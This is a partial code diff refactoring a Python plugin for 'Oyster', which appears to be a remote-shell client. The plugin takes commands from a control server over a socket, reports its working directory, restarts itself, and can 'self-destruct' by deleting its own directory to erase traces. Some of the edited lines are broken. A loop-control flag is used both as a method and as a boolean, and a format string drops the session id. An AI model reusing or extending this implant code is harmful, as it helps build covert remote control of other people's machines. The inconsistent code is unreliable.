@@ -6,17 +6,18 @@ from time import sleep
 from os import getcwd
 from shutil import rmtree
 from os.path import realpath
-from client import LoopController
+from common import LoopControl
 
 
 class Plugin(object):
     version = 'v1.0'
-    invocation = 'oyster'
+    invocation = 'oyster '
     enabled = True
     required = True
 
     def run(self, client, data):
         args = shlex.split(data)
+        lc = LoopControl()
 
         if not args:
             client.server_print('Oyster requires arguments to run.\n')
@@ -70,13 +71,11 @@ class Plugin(object):
         if args[0] == 'shell-reboot':
             client.send_data('confirmed')
             client.sock.close()
-            lc = LoopController()
-            lc.should_break = True
-            return lc
+            return lc.should_break()
 
         # Get the current working directory.
         if args[0] == 'getcwd':
-            self.send_data_with_cwd(client, '')
+            Plugin.send_data_with_cwd(client, '')
             return
 
         # Send a `pong` back to the server.
@@ -87,7 +86,6 @@ class Plugin(object):
         if args[0] == 'quit' or args[0] == 'exit':
             client.send_data('confirmed')
             sleep(1)
-            lc = LoopController()
             lc.should_break = True
             return lc
 
@@ -106,24 +104,19 @@ class Plugin(object):
             sleep(1)
             client.server_print('Boom!')
 
-            self.self_destruct()
+            Plugin.self_destruct()
             sys.exit()
-
-        # Check to see if the client should send the
-        # server shutdown confirmation.
-        if args[0] == 'server_shutdown?':
-            self.negotiate_server_shutdown(client)
-            return
 
         # Restart the `client.py` script.
         if args[0] == 'reboot':
             client.send_data('')
-            self.reboot(client)
+            Plugin.reboot_client(client)
             sys.exit()
 
         return
 
-    def self_destruct(self):
+    @staticmethod
+    def self_destruct():
         """
         Destroy self.
 
@@ -135,24 +128,8 @@ class Plugin(object):
         directory = __file__.replace(filename, '').replace(cd + '/', '')
         rmtree(directory)
 
-    def negotiate_server_shutdown(self, client):
-        """
-        Negotiate a server shutdown.
-
-        :return:
-        """
-
-        if client.server_shutdown:
-            client.send_data('Y')
-            client.sock.close()
-            if client.shutdown_kill:
-                sys.exit()
-            client.reboot_self()
-        else:
-            client.send_data('N')
-        return client
-
-    def send_data_with_cwd(self, client, some_data):
+    @staticmethod
+    def send_data_with_cwd(client, some_data):
         """
         Send something back to the control server with the current
         working directory appended to the end of it.
@@ -162,9 +139,10 @@ class Plugin(object):
         """
 
         client.sock.send(str.encode(some_data + str(getcwd()) + '> ' + '~!_TERM_$~'))
-        return self
+        return
 
-    def reboot(self, client):
+    @staticmethod
+    def reboot_client(client):
         """
         Reboot the client.
 
@@ -185,6 +163,8 @@ class Plugin(object):
             'session_id='.format(client.session_id)
         ]
 
+        # Try to use subprocess to reboot.  If there is a permissions error,
+        # use execv to try to achieve the same thing.
         try:
             popen_rc = [sys.executable] + list(sys.argv)
             p = subprocess.Popen(popen_rc)
